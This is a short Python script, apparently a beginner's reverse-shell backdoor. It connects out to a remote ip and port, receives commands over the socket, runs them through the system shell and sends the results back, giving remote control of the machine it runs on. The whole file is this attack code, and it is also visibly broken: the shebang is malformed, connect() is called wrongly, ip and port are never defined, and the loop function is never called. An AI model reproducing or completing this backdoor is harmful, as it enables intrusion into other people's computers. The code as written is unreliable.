#!usr/bin.env python
import socket, subprocess

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(ip, port)


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

def run(self):
    while True:
        command = connection.recv(1024)
        command_result = execute_system_command(command)
        connection.send(command_result)

connection.close()
